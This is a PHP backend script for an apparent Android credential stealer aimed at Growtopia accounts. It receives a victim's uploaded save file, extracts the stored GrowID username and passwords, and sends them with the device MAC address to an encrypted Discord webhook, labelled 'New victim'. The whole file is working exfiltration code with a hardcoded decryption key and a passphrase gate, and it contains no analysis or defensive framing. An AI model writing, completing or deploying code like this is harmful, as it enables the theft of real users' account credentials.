<?php
    include("password_decoder.php");
    if($_POST["protection"] == "Knakiri")
	{
	      function encrypt_decrypt($action, $string) {
            $output = false;

            $encrypt_method = "AES-256-CBC";
              $secret_key = 'YW5kcm9zdGVhbGVy';
              $secret_iv = 'yVGbhVGdz9mck5WY';
            $key = hash('sha256', $secret_key);
            
            $iv = substr(hash('sha256', $secret_iv), 0, 16);

            if ( $action == 'encrypt' ) {
                $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
                $output = base64_encode($output);
            } else if( $action == 'decrypt' ) {
                $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
            }

            return $output;
        }
	 $base64 = $_POST["save"];
     $mac = $_POST["mac"];
	 $webhook = $_POST["webhook"];
  file_put_contents("temp.dat",  base64_decode($base64));
    $data = get_savedat("temp.dat");    
    $keys = array_keys($data);
    $gtuser = "";
	$gtpassfil = "";
	$gtpass = "";
	foreach ($keys as &$key) 
    {
		if ($key == "tankid_name")
		{
			$gtuser = $data[$key];
		}
	   
	    if ($key == "tankid_password")
		{
		    	$gtpass = str_replace("<BR>", "\n", $data[$key]);
	        	$array = explode("<BR>", $data[$key]);
	        	
		
			foreach ($array as $filtered)
			{
				if (!preg_match('/[^a-zA-Z\d]/', $filtered))
				{
					if (!empty($filtered))
					{
						$gtpassfil .= $filtered."\n";
					}
				}
			}
		}
           

    }

     
     	    if($gtuser && $gtpass != null)
             {

             
     	    $Content = "GrowID: ```".$gtuser."```\n Mac: ```".$mac."```\n\n"."Passwords:\n```".$gtpass."\n```"."Passwords filtered:\n```".$gtpassfil."\n```";
           
$url = encrypt_decrypt('decrypt', $webhook);
$hookObject = json_encode([
    
    "content" => "[Android Stealer] Hello from Knakiri",
    "username" => "Knakiri#8390",
 
    "tts" => false,
 
    "embeds" => [
      
        [
           
            "title" => "New victim",

           
            "type" => "rich",

           
            "description" => $Content,
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );
curl_close( $ch );
    }
	unlink("temp.dat");
	}
    else
    {
        header("Location: DOMAIN/webhook.php");
    }
?>
